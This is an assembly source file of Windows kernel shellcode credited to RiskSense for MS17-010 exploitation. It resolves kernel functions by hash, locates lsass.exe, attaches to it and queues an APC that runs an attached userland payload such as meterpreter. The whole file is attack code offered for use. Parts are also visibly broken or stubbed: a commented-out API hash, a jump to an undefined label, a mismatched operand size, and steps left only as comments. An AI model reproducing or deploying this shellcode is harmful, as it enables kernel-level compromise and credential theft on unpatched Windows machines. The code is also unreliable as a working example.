;
; Windows x86/x64 Kernel Ring 0 to Ring 3 via Queued APC Shellcode
;
; Author: Sean Dillon <sean.dillon@risksense.com> (@zerosum0x0)
; Copyright: (c) 2017 RiskSense, Inc.
; License: Apache 2.0
;
; Source: https://github.com/Risksense-Ops/MS17-010
; Description: Add whatever userland payload you want to the end.
; Build: nasm kernel.asm
;

; options which can be enabled
; %define CLEAR_DIRECTION_FLAG        ; if cld should be run
; %define SYSCALL_OVERWRITE           ; to run at process IRQL in syscall
; %define ERROR_CHECKS                ; lessen chance of BSOD, but bigger size
%define USE_X86                       ; include x86 payload
%define USE_X64                       ; include x64 payload
%define PROCESS_HASH LSASS_EXE_HASH   ; the process to queue APC into

LSASS_EXE_HASH                    equ      0x60795e4a   ; hash("lsass.exe")
SPOOLSV_EXE_HASH                  equ      0xdd1f77bf   ; hash("spoolsv.exe")
CREATETHREAD_HASH                 equ      0x221b4546   ; hash("CreateThread")
PSGETCURRENTPROCESS_HASH          equ      0x6211725c   ; hash("PsGetCurrentProcess")
PSLOOKUPPROCESSBYPROCESSID_HASH   equ      0x4ba25566   ; hash("PsLookupProcessByProcessId")
PSGETPROCESSIMAGEFILENAME_HASH    equ      0x2d726fa3   ; hash("PsGetProcessImageFileName")
KEGETCURRENTPROCESS_HASH          equ      0x5e91685c   ; hash("KeGetCurrentProcess")
KEGETCURRENTTHREAD_HASH           equ      0x30a3ba7a   ; hash("KeGetCurrentThread")
KEINITIALIZEAPC_HASH              equ      0x4b55ceac   ; hash("KeInitializeApc")
KEINSERTQUEUEAPC_HASH             equ      0x9e093818   ; hash("KeInsertQueueApc")
KESTACKATTACHPROCESS_HASH         equ      0xdc1124e5   ; hash("KeStackAttachProcess")
KEUNSTACKDETACHPROCESS_HASH       equ      0x7db3b722   ; hash("KeUnstackDetachProcess")
ZWALLOCATEVIRTUALMEMORY_HASH      equ      0xee0aca4b   ; hash("ZwAllocateVirtualMemory")
EXALLOCATEPOOL_HASH               equ      0x9150ac26   ; hash("ExAllocatePool")
OBFDEREFERENCEOBJECT_HASH         equ      0x764dc812   ; hash("ObfDereferenceObject")
KERNEL32_DLL_HASH                 equ      0x92af16da   ; hashU("kernel32.dll")

payload_start:

%ifdef SYSCALL_OVERWRITE
syscall_overwrite:
%endif

x64_kernel_start:
%ifdef CLEAR_DIRECTION_FLAG
  cld
%endif

  push rsi                                          ; save clobbered registers
  push r15                                          ; r15 will store ntoskernl.exe
  push rbp

  mov rbp, rsp                                      ; we'll use the base pointer
  and sp, 0xFFF0                                    ; align stack

; this stub loads ntoskrnl.exe into r15
x64_find_nt_idt:
  mov r15, qword [gs:0x38]    ; get IdtBase of KPCR
  mov r15, qword [r15+0x4]    ; get ISR address
  shr r15, 0xc                ; strip to page size
  shl r15, 0xc

_x64_find_nt_idt_walk_page:
  sub r15, 0x1000             ; walk along page size
  mov rsi, qword [r15]
  cmp si, 0x5a4d              ; 'MZ' header
  jne _x64_find_nt_idt_walk_page

  lea rdx, [rel x64_kernel_start]                             ; overwrite the _start with PEPROCESS
  mov r10d, LSASS_EXE_HASH

x64_find_process_name:
  xor ecx, ecx

_x64_find_process_name_loop_pid:
  add cx, 0x4
  cmp ecx, 0x10000
  jge kernel_exit

  push rdx
                                                ; rcx = PID
                                                ; rdx = *PEPROCESS
  mov r11d, PSLOOKUPPROCESSBYPROCESSID_HASH
  call block_api_direct
  add rsp, 0x20

  test rax, rax                                 ; see if STATUS_SUCCESS
  jnz _find_process_name_loop_pid


  pop rdx
  mov rcx, dword [rdx]                          ; *rcx = *PEPROCESS

  push rcx
  mov r11d, PSGETPROCESSIMAGEFILENAME_HASH
  call block_api_direct
  add rsp, 0x20
  pop rcx

  mov rsi, rax
  call calc_hash

  cmp r9d, r10d
  jne _x64_find_process_name_loop_pid

  lea rdx, qword [rel x64_kernel_start]       ; rdx = PRKAPC_STATE
  mov rcx, qword [rdx]                        ; rdx = PEPROCESS

  ; KeStackAttachProcess
  mov r11d, KESTACKATTACHPROCESS_HASH
  call block_api_direct

  ; ZwAllocateVirtualMemory

  push 0x40
  push 0x1000
  ; mov r11d, ZWALLOCATEVIRTUALMEMORY_HASH
  call block_api_direct
  add rsp, 0x38

  ; rep movs userland

  ; Teb loop

  ; ExAllocatePool(POOL_TYPE.NonPagedPool, 0x90);
  xor edx, edx
  add dl, 0x90
  xor ecx, ecx
  mov r11d, EXALLOCATEPOOL_HASH
  ; sub rsp, 0x20
  call block_api_direct
  ; add rsp, 0x40
  add rsp, 0x20


  ; KeInitializeApc()
  xor r8, r8
  mov r11d, KEINITIALIZEAPC_HASH
  call block_api_direct
  add rsp, 0x40

  ; KeInsertQueueApc(pAPC, NULL, NULL, NULL);
  xor r8, r8
  xor r9, r9
  xor rdx, rdx
  mov r11d, KEINSERTQUEUEAPC_HASH
  call block_api_direct
  add rsp, 0x20

  ; KeUnstackDetach
  ; ObfDereferenceObject

%include "./src/kernel/calc_thread_delta.asm"

kernel_exit:


  mov rsp, rbp

  pop r15
  pop rsi                                           ; restore clobbered registers and return

  pop rbp
  ret

userland_start:

  jmp userland_start_thread

; user and kernel mode re-use this code
%include "./src/single/calc_hash.asm"
%include "./src/block/block_api_direct.asm"

userland_start_thread:
%include "./src/single/createthread.asm"

userland_payload:
  ; insert userland payload here
  ; such as meterpreter
  ; or reflective dll with the metasploit MZ pre-stub
